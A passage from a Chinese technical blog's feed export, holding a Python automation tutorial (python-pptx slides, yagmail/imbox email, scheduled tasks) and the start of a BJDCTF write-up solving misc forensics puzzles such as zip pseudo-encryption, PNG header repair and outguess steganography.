punctuation">.</span>text<span class="token operator">=</span><span class="token string">'兹证明'</span>winning_reason<span class="token punctuation">.</span>text<span class="token operator">=</span><span class="token string">'学习好，身体好'</span>prs<span class="token punctuation">.</span>save<span class="token punctuation">(</span><span class="token string">'test.pptx'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="添加段落"><a href="#添加段落" class="headerlink" title="添加段落"></a>添加段落</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pptx <span class="token keyword">import</span> Presentationprs<span class="token operator">=</span>Presentation<span class="token punctuation">(</span><span class="token string">'1.pptx'</span><span class="token punctuation">)</span>slide<span class="token operator">=</span>prs<span class="token punctuation">.</span>slides<span class="token punctuation">.</span>add_slide<span class="token punctuation">(</span>prs<span class="token punctuation">.</span>slide_layouts<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    shapes<span class="token operator">=</span>slide<span class="token punctuation">.</span>shapestitle_shape<span class="token operator">=</span>shapes<span class="token punctuation">.</span>titlebody_shape<span class="token operator">=</span>shapes<span class="token punctuation">.</span>placeholders<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>title_shape<span class="token punctuation">.</span>text<span class="token operator">=</span><span class="token string">'title'</span>tf<span class="token operator">=</span>body_shape<span class="token punctuation">.</span>text_frametf<span class="token punctuation">.</span>text<span class="token operator">=</span><span class="token string">'p1'</span>p<span class="token operator">=</span>tf<span class="token punctuation">.</span>add_paragraph<span class="token punctuation">(</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>text<span class="token operator">=</span><span class="token string">'p2'</span>p<span class="token punctuation">.</span>level<span class="token operator">=</span><span class="token number">1</span>                   <span class="token comment">#设定层级关系，默认最高层级为0级</span>p<span class="token operator">=</span>tf<span class="token punctuation">.</span>add_paragraph<span class="token punctuation">(</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>text<span class="token operator">=</span><span class="token string">'p3'</span>p<span class="token punctuation">.</span>level<span class="token operator">=</span><span class="token number">2</span>prs<span class="token punctuation">.</span>save<span class="token punctuation">(</span><span class="token string">'test.pptx'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="添加一个文本框"><a href="#添加一个文本框" class="headerlink" title="添加一个文本框"></a>添加一个文本框</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pptx <span class="token keyword">import</span> Presentation<span class="token keyword">from</span> pptx<span class="token punctuation">.</span>util <span class="token keyword">import</span> Cm<span class="token punctuation">,</span>Ptprs<span class="token operator">=</span>Presentation<span class="token punctuation">(</span><span class="token string">'1.pptx'</span><span class="token punctuation">)</span>slide<span class="token operator">=</span>prs<span class="token punctuation">.</span>slides<span class="token punctuation">.</span>add_slide<span class="token punctuation">(</span>prs<span class="token punctuation">.</span>slide_layouts<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    left<span class="token operator">=</span>top<span class="token operator">=</span>width<span class="token operator">=</span>height<span class="token operator">=</span>Cm<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>                 <span class="token comment">#距离上下左右多少cm</span>text_box<span class="token operator">=</span>slide<span class="token punctuation">.</span>shapes<span class="token punctuation">.</span>add_textbox<span class="token punctuation">(</span>left<span class="token punctuation">,</span>top<span class="token punctuation">,</span>width<span class="token punctuation">,</span>height<span class="token punctuation">)</span>tf<span class="token operator">=</span>text_box<span class="token punctuation">.</span>text_frametf<span class="token punctuation">.</span>text<span class="token operator">=</span><span class="token string">'words in the text box'</span>p<span class="token operator">=</span>tf<span class="token punctuation">.</span>add_paragraph<span class="token punctuation">(</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>text<span class="token operator">=</span><span class="token string">"second paragraph bold font-size is 40"</span>p<span class="token punctuation">.</span>font<span class="token punctuation">.</span>bold<span class="token operator">=</span><span class="token boolean">True</span>p<span class="token punctuation">.</span>font<span class="token punctuation">.</span>size<span class="token operator">=</span>Pt<span class="token punctuation">(</span><span class="token number">40</span><span class="token punctuation">)</span>prs<span class="token punctuation">.</span>save<span class="token punctuation">(</span><span class="token string">'test.pptx'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="添加图片"><a href="#添加图片" class="headerlink" title="添加图片"></a>添加图片</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pptx <span class="token keyword">import</span> Presentation<span class="token keyword">from</span> pptx<span class="token punctuation">.</span>util <span class="token keyword">import</span> Cmprs<span class="token operator">=</span>Presentation<span class="token punctuation">(</span><span class="token string">'1.pptx'</span><span class="token punctuation">)</span>slide<span class="token operator">=</span>prs<span class="token punctuation">.</span>slides<span class="token punctuation">.</span>add_slide<span class="token punctuation">(</span>prs<span class="token punctuation">.</span>slide_layouts<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    left<span class="token operator">=</span>top<span class="token operator">=</span>Cm<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>                 pic<span class="token operator">=</span>slide<span class="token punctuation">.</span>shapes<span class="token punctuation">.</span>add_picture<span class="token punctuation">(</span><span class="token string">'landscape.jpg'</span><span class="token punctuation">,</span>left<span class="token punctuation">,</span>top<span class="token punctuation">)</span>left<span class="token operator">=</span>Cm<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>height<span class="token operator">=</span>Cm<span class="token punctuation">(</span><span class="token number">5.5</span><span class="token punctuation">)</span>pic<span class="token operator">=</span>slide<span class="token punctuation">.</span>shapes<span class="token punctuation">.</span>add_picture<span class="token punctuation">(</span><span class="token string">'landscape.jpg'</span><span class="token punctuation">,</span>left<span class="token punctuation">,</span>top<span class="token punctuation">,</span>height<span class="token operator">=</span>height<span class="token punctuation">)</span>prs<span class="token punctuation">.</span>save<span class="token punctuation">(</span><span class="token string">'test.pptx'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="添加表格"><a href="#添加表格" class="headerlink" title="添加表格"></a>添加表格</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pptx <span class="token keyword">import</span> Presentation<span class="token keyword">from</span> pptx<span class="token punctuation">.</span>util <span class="token keyword">import</span> Cmprs<span class="token operator">=</span>Presentation<span class="token punctuation">(</span><span class="token string">'1.pptx'</span><span class="token punctuation">)</span>slide<span class="token operator">=</span>prs<span class="token punctuation">.</span>slides<span class="token punctuation">.</span>add_slide<span class="token punctuation">(</span>prs<span class="token punctuation">.</span>slide_layouts<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>   shapes<span class="token operator">=</span>slide<span class="token punctuation">.</span>shapes rows<span class="token punctuation">,</span>cols<span class="token operator">=</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">2</span>left<span class="token operator">=</span>top<span class="token operator">=</span>Cm<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>                 width<span class="token operator">=</span>Cm<span class="token punctuation">(</span><span class="token number">18</span><span class="token punctuation">)</span>height<span class="token operator">=</span>Cm<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>table<span class="token operator">=</span>shapes<span class="token punctuation">.</span>add_table<span class="token punctuation">(</span>rows<span class="token punctuation">,</span>cols<span class="token punctuation">,</span>left<span class="token punctuation">,</span>top<span class="token punctuation">,</span>width<span class="token punctuation">,</span>height<span class="token punctuation">)</span><span class="token punctuation">.</span>tabletable<span class="token punctuation">.</span>columns<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>width<span class="token operator">=</span>Cm<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span>table<span class="token punctuation">.</span>columns<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>width<span class="token operator">=</span>Cm<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>table<span class="token punctuation">.</span>rows<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>height<span class="token operator">=</span>Cm<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>records<span class="token operator">=</span><span class="token punctuation">[</span>    <span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">,</span><span class="token string">'grade'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token punctuation">[</span><span class="token string">'Li lei'</span><span class="token punctuation">,</span><span class="token number">95</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token punctuation">[</span><span class="token string">'Han meimei'</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token punctuation">[</span><span class="token string">'Ma dongmei'</span><span class="token punctuation">,</span><span class="token number">98</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token keyword">for</span> row <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>rows<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> col <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>cols<span class="token punctuation">)</span><span class="token punctuation">:</span>        table<span class="token punctuation">.</span>cell<span class="token punctuation">(</span>row<span class="token punctuation">,</span>col<span class="token punctuation">)</span><span class="token punctuation">.</span>text<span class="token operator">=</span><span class="token builtin">str</span><span class="token punctuation">(</span>records<span class="token punctuation">[</span>row<span class="token punctuation">]</span><span class="token punctuation">[</span>col<span class="token punctuation">]</span><span class="token punctuation">)</span>prs<span class="token punctuation">.</span>save<span class="token punctuation">(</span><span class="token string">'test.pptx'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="文本框样式"><a href="#文本框样式" class="headerlink" title="文本框样式"></a>文本框样式</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pptx <span class="token keyword">import</span> Presentation<span class="token keyword">from</span> pptx<span class="token punctuation">.</span>util <span class="token keyword">import</span> Cm<span class="token keyword">from</span> pptx<span class="token punctuation">.</span>enum<span class="token punctuation">.</span>text <span class="token keyword">import</span> MSO_ANCHOR<span class="token punctuation">,</span>MSO_AUTO_SIZE<span class="token keyword">from</span> pptx<span class="token punctuation">.</span>dml<span class="token punctuation">.</span>color <span class="token keyword">import</span> RGBColor<span class="token keyword">from</span> pptx<span class="token punctuation">.</span>enum<span class="token punctuation">.</span>text <span class="token keyword">import</span> PP_ALIGNprs<span class="token operator">=</span>Presentation<span class="token punctuation">(</span><span class="token string">'1.pptx'</span><span class="token punctuation">)</span>slide<span class="token operator">=</span>prs<span class="token punctuation">.</span>slides<span class="token punctuation">.</span>add_slide<span class="token punctuation">(</span>prs<span class="token punctuation">.</span>slide_layouts<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>   left<span class="token operator">=</span>top<span class="token operator">=</span>width<span class="token operator">=</span>height<span class="token operator">=</span>Cm<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>text_box<span class="token operator">=</span>slide<span class="token punctuation">.</span>shapes<span class="token punctuation">.</span>add_textbox<span class="token punctuation">(</span>left<span class="token punctuation">,</span>top<span class="token punctuation">,</span>width<span class="token punctuation">,</span>height<span class="token punctuation">)</span>tf<span class="token operator">=</span>text_box<span class="token punctuation">.</span>text_frametf<span class="token punctuation">.</span>text<span class="token operator">=</span><span class="token string">"text box word"</span>tf<span class="token punctuation">.</span>margin_bottom<span class="token operator">=</span>Cm<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>                                <span class="token comment">#下边距</span>tf<span class="token punctuation">.</span>margin_left<span class="token operator">=</span><span class="token number">0</span>                                        <span class="token comment">#左边距</span>tf<span class="token punctuation">.</span>vertical_anchor<span class="token operator">=</span>MSO_ANCHOR<span class="token punctuation">.</span>BOTTOM                    <span class="token comment">#底端对齐</span>tf<span class="token punctuation">.</span>word_wrap<span class="token operator">=</span><span class="token boolean">True</span>                                       <span class="token comment">#框中的文字自动换行</span>fill<span class="token operator">=</span>text_box<span class="token punctuation">.</span>fillfill<span class="token punctuation">.</span>solid<span class="token punctuation">(</span><span class="token punctuation">)</span>                                            <span class="token comment">#纯色填充</span>fill<span class="token punctuation">.</span>fore_color<span class="token punctuation">.</span>rgb<span class="token operator">=</span>RGBColor<span class="token punctuation">(</span><span class="token number">247</span><span class="token punctuation">,</span><span class="token number">150</span><span class="token punctuation">,</span><span class="token number">70</span><span class="token punctuation">)</span>fill<span class="token punctuation">.</span>transparency<span class="token operator">=</span><span class="token number">0.25</span>line<span class="token operator">=</span>text_box<span class="token punctuation">.</span>line                                      <span class="token comment">#边框样式</span>line<span class="token punctuation">.</span>color<span class="token punctuation">.</span>rgb<span class="token operator">=</span>RGBColor<span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span>line<span class="token punctuation">.</span>width<span class="token operator">=</span>Cm<span class="token punctuation">(</span><span class="token number">0.3</span><span class="token punctuation">)</span>p<span class="token operator">=</span>tf<span class="token punctuation">.</span>add_paragraph<span class="token punctuation">(</span><span class="token punctuation">)</span>                                    <span class="token comment">#段落对齐</span>p<span class="token punctuation">.</span>text<span class="token operator">=</span><span class="token string">"second words"</span>p<span class="token punctuation">.</span>alignment<span class="token operator">=</span>PP_ALIGN<span class="token punctuation">.</span>RIGHTprs<span class="token punctuation">.</span>save<span class="token punctuation">(</span><span class="token string">'test.pptx'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="邮件"><a href="#邮件" class="headerlink" title="邮件"></a>邮件</h2><h3 id="发送邮件"><a href="#发送邮件" class="headerlink" title="发送邮件"></a>发送邮件</h3><p>邮箱必须开通POP3/SMTP/IMAP，和各服务器域名<br><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_blog/python-auto-f5.png"><br>使用如下代码在python交互式解释器中存入邮件地址和检验码</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">import</span> yagmail<span class="token operator">>></span><span class="token operator">></span> yagmail<span class="token punctuation">.</span>register<span class="token punctuation">(</span><span class="token string">'a@163.com'</span><span class="token punctuation">,</span><span class="token string">'检验码'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> yagmailyag<span class="token operator">=</span>yagmail<span class="token punctuation">.</span>SMTP<span class="token punctuation">(</span>user<span class="token operator">=</span><span class="token string">'a@163.com'</span><span class="token punctuation">,</span>host<span class="token operator">=</span><span class="token string">'smtp.163.com'</span><span class="token punctuation">)</span>contents<span class="token operator">=</span><span class="token punctuation">[</span>    <span class="token string">'first paragraph'</span><span class="token punctuation">,</span>    <span class="token string">'second paragraph'</span><span class="token punctuation">,</span>    <span class="token string">'&lt;a href="https://ezysec.cn">ezy-blog&lt;/a>'</span><span class="token punctuation">,</span>                  <span class="token comment">#发送带有HTML样式的邮件</span>    <span class="token string">'landscape.jpg'</span><span class="token punctuation">,</span>                                             <span class="token comment">#填写本机文件地址即可发送附件</span>    yagmail<span class="token punctuation">.</span>inline<span class="token punctuation">(</span><span class="token string">'landscape.jpg'</span><span class="token punctuation">)</span>                             <span class="token comment">#图片嵌入正文</span><span class="token punctuation">]</span>yag<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'a@163.com'</span><span class="token punctuation">,</span><span class="token string">'an-email'</span><span class="token punctuation">,</span>contents<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>如果需要群发，修改yag.send参数即可，yag.send([‘<a href="mailto:&#97;&#x40;&#49;&#54;&#51;&#46;&#99;&#x6f;&#x6d;">&#97;&#x40;&#49;&#54;&#51;&#46;&#99;&#x6f;&#x6d;</a>‘,‘<a href="mailto:&#x61;&#64;&#97;&#46;&#99;&#x6f;&#x6d;">&#x61;&#64;&#97;&#46;&#99;&#x6f;&#x6d;</a>‘],’an-email’,contents)</p></blockquote><h3 id="读取邮件"><a href="#读取邮件" class="headerlink" title="读取邮件"></a>读取邮件</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> keyringpassward<span class="token operator">=</span>keyring<span class="token punctuation">.</span>get_password<span class="token punctuation">(</span><span class="token string">"yagmail"</span><span class="token punctuation">,</span><span class="token string">"a@163.com"</span><span class="token punctuation">)</span>  <span class="token comment">#前提是通过yagmail设置好密码</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>需要设置允许第三方客户端读取内容<code>http://config.mail.163.com/settings/imap/login.jsp?uid=a@163.com</code></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> imbox <span class="token keyword">import</span> Imbox<span class="token keyword">import</span> keyringpassword<span class="token operator">=</span>keyring<span class="token punctuation">.</span>get_password<span class="token punctuation">(</span><span class="token string">"yagmail"</span><span class="token punctuation">,</span><span class="token string">"ezy0812@163.com"</span><span class="token punctuation">)</span><span class="token keyword">with</span> Imbox<span class="token punctuation">(</span><span class="token string">'imap.163.com'</span><span class="token punctuation">,</span><span class="token string">'ezy0812@163.com'</span><span class="token punctuation">,</span>password<span class="token punctuation">,</span>ssl<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span> <span class="token keyword">as</span> imbox<span class="token punctuation">:</span>    all_inbox_messages<span class="token operator">=</span>imbox<span class="token punctuation">.</span>messages<span class="token punctuation">(</span><span class="token punctuation">)</span>             <span class="token comment">#不加参数时读取所有邮件</span>    <span class="token keyword">for</span> uid<span class="token punctuation">,</span>message <span class="token keyword">in</span> all_inbox_messages<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>message<span class="token punctuation">.</span>subject<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>message<span class="token punctuation">.</span>body<span class="token punctuation">[</span><span class="token string">'plain'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>message.sent_from     发件人<br>message.sent_to       收件人<br>message.subject       主题<br>message.date          时间<br>message.body[‘plain’] 文本格式内容<br>message.body[‘html’]  HTML格式内容<br>message.attachements  附件</p></blockquote><blockquote><p>imbox.messages(unread=True)           查看未读邮件<br>imbox.messages(flagged=True)          查看红旗邮件<br>imbox.messages(sent_from=‘<a href="mailto:&#x61;&#64;&#x61;&#x2e;&#99;&#111;&#109;">&#x61;&#64;&#x61;&#x2e;&#99;&#111;&#109;</a>‘)   查看某发件人邮件<br>imbox.messages(sent_to=‘<a href="mailto:&#97;&#64;&#97;&#x2e;&#99;&#111;&#x6d;">&#97;&#64;&#97;&#x2e;&#99;&#111;&#x6d;</a>‘)     查看某收件人邮件<br>imbox.messages(data_lt=datetime.data(2019,10,8))          具体日期某天前(import datetime)<br>imbox.messages(data_gt=datetime.data(2019,10,8))          具体日期某天后<br>imbox.messages(data_on=datetime.data(2019,10,8))          指定某一天</p></blockquote><h3 id="标记已读和删除邮件"><a href="#标记已读和删除邮件" class="headerlink" title="标记已读和删除邮件"></a>标记已读和删除邮件</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">for</span> uid<span class="token punctuation">,</span>message <span class="token keyword">in</span> all_inbox_messages<span class="token punctuation">:</span>    <span class="token keyword">if</span> 某种条件<span class="token punctuation">:</span>        imbox<span class="token punctuation">.</span>delete<span class="token punctuation">(</span>uid<span class="token punctuation">)</span>        imbox<span class="token punctuation">.</span>mark_seen<span class="token punctuation">(</span>uid<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="定时任务"><a href="#定时任务" class="headerlink" title="定时任务"></a>定时任务</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> schedule<span class="token keyword">import</span> time<span class="token keyword">def</span> <span class="token function">job</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"填写所要做的任务"</span><span class="token punctuation">)</span>schedule<span class="token punctuation">.</span>every<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">.</span>minutes<span class="token punctuation">.</span>do<span class="token punctuation">(</span>job<span class="token punctuation">)</span>              <span class="token comment">#每10分钟做一次</span>schedule<span class="token punctuation">.</span>every<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hour<span class="token punctuation">.</span>do<span class="token punctuation">(</span>job<span class="token punctuation">)</span>                   <span class="token comment">#every里无参数代表1，每1小时做一次</span>schedule<span class="token punctuation">.</span>every<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>day<span class="token punctuation">.</span>at<span class="token punctuation">(</span><span class="token string">"10:30"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>do<span class="token punctuation">(</span>job<span class="token punctuation">)</span>        <span class="token comment">#每天在10:30时做一次</span>schedule<span class="token punctuation">.</span>every<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">.</span>to<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">.</span>minutes<span class="token punctuation">.</span>do<span class="token punctuation">(</span>job<span class="token punctuation">)</span>        <span class="token comment">#每5到10分钟做一次</span>schedule<span class="token punctuation">.</span>every<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>monday<span class="token punctuation">.</span>do<span class="token punctuation">(</span>job<span class="token punctuation">)</span>                 <span class="token comment">#每周一做一次</span>schedule<span class="token punctuation">.</span>every<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>wednesday<span class="token punctuation">.</span>at<span class="token punctuation">(</span><span class="token string">"13:15"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>do<span class="token punctuation">(</span>job<span class="token punctuation">)</span>  <span class="token comment">#每周三13:15做一次</span>schedule<span class="token punctuation">.</span>every<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>minutes<span class="token punctuation">.</span>at<span class="token punctuation">(</span><span class="token string">":17"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>do<span class="token punctuation">(</span>job<span class="token punctuation">)</span>      <span class="token comment">#每分钟在第17秒做一次</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    schedule<span class="token punctuation">.</span>run_pending<span class="token punctuation">(</span><span class="token punctuation">)</span>    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Learning_Notes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 脚本编写 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BJDCTF记录</title>
      <link href="/2020/03/25/BJDCTF%E8%AE%B0%E5%BD%95/"/>
      <url>/2020/03/25/BJDCTF%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<p>一次CTF比赛记录</p><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="小姐姐"><a href="#小姐姐" class="headerlink" title="小姐姐"></a>小姐姐</h3><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_WriteUp/BJDCTF_f1.jpeg"></p><p>可以看到图片中间明显错位，直接UltraEdit搜索BJD</p><blockquote><p>想复杂了，想改变图片高度宽度之类的，淦</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_WriteUp/BJDCTF_f2.png"></p><p>或者使用strings命令</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">kali@kali:~&#x2F;Desktop$ strings xiaojiejie.jpeg | grep &quot;BJD&quot;BJD&#123;haokanma_xjj&#125;|&#x2F;|<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="简单的MISC"><a href="#简单的MISC" class="headerlink" title="简单的MISC"></a>简单的MISC</h3><p><a href="https://cdn.jsdelivr.net/gh/ezy0812/CDN/CTF-files/secret.zip">题目</a><br>先是zip伪加密</p><blockquote><p>拿到一个压缩文件，先查看是否是伪加密</p></blockquote><blockquote><p>在压缩文件里的每个文件的文件目录字段有一位专门标识了文件是否加密，将其设置为00，若为伪加密，即可成功解开压缩包</p></blockquote><p>用UltraEdit打开压缩包，搜索目录字段 50 4B 01 02，从50开始计算，第九第十个bit即为加密字段，将其设置为00<br><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_WriteUp/BJDCTF_f3.png"><br>成功解开压缩包</p><p>打开secret文件，查看到有IHDR数据块<br><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_WriteUp/BJDCTF_f4.png"> </p><blockquote><p>IHDR数据块是PNG文件头数据块，二进制为0D 0A 1A 0A  </p></blockquote><p>缺失了PNG文件头，补上文件头89 50 4E 47<br><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_WriteUp/BJDCTF_f5.png"><br>后缀名改成png，可以看到一串字符串<br>尝试16进制解码得到flag</p><h3 id="TARGZ"><a href="#TARGZ" class="headerlink" title="TARGZ"></a>TARGZ</h3><p><a href="https://cdn.jsdelivr.net/gh/ezy0812/CDN/CTF-files/hW1ES89jF.tar.gz">题目</a><br>题目中提示解压密码不需要爆破，密码猜想是文件名字<br><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_WriteUp/BJDCTF_f6.png"><br>解压之后发现又是一个压缩包，使用Python脚本递归解压</p><details><summary>python脚本</summary><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> zipfilep <span class="token operator">=</span> <span class="token string">'hW1ES89jF'</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    z<span class="token operator">=</span>zipfile<span class="token punctuation">.</span>ZipFile<span class="token punctuation">(</span>p<span class="token operator">+</span><span class="token string">'.tar.gz'</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span>    z<span class="token punctuation">.</span>extractall<span class="token punctuation">(</span>pwd<span class="token operator">=</span>p<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token operator">=</span>z<span class="token punctuation">.</span>namelist<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">9</span><span class="token punctuation">]</span>    z<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></details><blockquote><p>注意pwd参数需要转成字节</p></blockquote><p>最后报错得出flag文件</p><h3 id="圣火昭昭"><a href="#圣火昭昭" class="headerlink" title="圣火昭昭"></a>圣火昭昭</h3><p><a href="https://cdn.jsdelivr.net/gh/ezy0812/CDN/CTF-files/sheng_huo_zhao_zhao.zip">题目</a><br>题目提示全靠<strong>猜</strong>，使用outguess<br><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_WriteUp/BJDCTF_f7.png"><br>查看图片备注信息，是新佛曰，去<a href="http://hi.pcmoe.net/buddha.html">网站</a>解密得到密码<br>使用outguess解密图片得到flag  </p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">outguess -k &quot;gemlove&quot; -r sheng_huo_zhao_zhao.jpg 1.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="A-Beautiful-Picture"><a href="#A-Beautiful-Picture" class="headerlink" title="A_Beautiful_Picture"></a>A_Beautiful_Picture</h3><p><img 